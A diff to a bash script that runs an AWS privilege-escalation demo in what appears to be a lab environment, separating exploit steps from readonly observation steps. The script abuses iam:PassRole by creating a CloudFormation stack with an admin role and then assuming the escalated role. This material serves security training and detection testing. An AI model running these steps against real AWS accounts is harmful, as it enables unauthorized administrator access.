@@ -67,6 +67,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 if [ -z "$AWS_REGION" ]; then
     echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
@@ -75,22 +84,32 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -101,15 +120,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -159,8 +180,9 @@ cat $TEMPLATE_FILE
 echo ""
 echo -e "${GREEN}✓ CloudFormation template created${NC}\n"
 
-# Step 6: Create CloudFormation stack with PassRole
+# [EXPLOIT] Step 6: Create CloudFormation stack with PassRole
 echo -e "${YELLOW}Step 6: Creating CloudFormation stack with admin role${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector - passing the admin role to CloudFormation..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin role ARN: $ADMIN_ROLE_ARN"
@@ -178,8 +200,9 @@ aws cloudformation create-stack \
 
 echo -e "${GREEN}✓ CloudFormation stack creation initiated${NC}\n"
 
-# Step 7: Wait for stack creation to complete
+# [OBSERVATION] Step 7: Wait for stack creation to complete
 echo -e "${YELLOW}Step 7: Waiting for CloudFormation stack to complete${NC}"
+use_readonly_creds
 echo "This may take 30-60 seconds..."
 echo ""
 
@@ -188,7 +211,7 @@ WAIT_TIME=0
 STACK_COMPLETE=false
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
-    show_cmd "Attacker" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].StackStatus' --output text"
+    show_cmd "ReadOnly" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].StackStatus' --output text"
     STACK_STATUS=$(aws cloudformation describe-stacks \
         --region $AWS_REGION \
         --stack-name $STACK_NAME \
@@ -222,9 +245,10 @@ if [ "$STACK_COMPLETE" = false ]; then
     exit 1
 fi
 
-# Step 8: Get the escalated role ARN from stack outputs
+# [OBSERVATION] Step 8: Get the escalated role ARN from stack outputs
 echo -e "${YELLOW}Step 8: Retrieving escalated role ARN from stack outputs${NC}"
-show_cmd "Attacker" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].Outputs[?OutputKey==\`EscalatedRoleArn\`].OutputValue' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].Outputs[?OutputKey==\`EscalatedRoleArn\`].OutputValue' --output text"
 ESCALATED_ROLE_ARN=$(aws cloudformation describe-stacks \
     --region $AWS_REGION \
     --stack-name $STACK_NAME \
@@ -239,8 +263,9 @@ fi
 echo "Escalated role ARN: $ESCALATED_ROLE_ARN"
 echo -e "${GREEN}✓ Retrieved escalated role ARN${NC}\n"
 
-# Step 9: Assume the escalated role
+# [EXPLOIT] Step 9: Assume the escalated role
 echo -e "${YELLOW}Step 9: Assuming the escalated admin role${NC}"
+use_starting_creds
 echo "This role was created by CloudFormation and has administrator access..."
 echo ""
 
@@ -248,7 +273,7 @@ echo ""
 echo "Waiting for IAM propagation (5 seconds)..."
 sleep 5
 
-show_cmd "Attacker" "aws sts assume-role --role-arn $ESCALATED_ROLE_ARN --role-session-name escalation-demo --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ESCALATED_ROLE_ARN --role-session-name escalation-demo --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ESCALATED_ROLE_ARN \
     --role-session-name escalation-demo \
@@ -267,7 +292,7 @@ ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed escalated role${NC}\n"
 
-# Step 10: Verify admin access
+# [EXPLOIT] Step 10: Verify admin access using escalated role session
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 echo ""
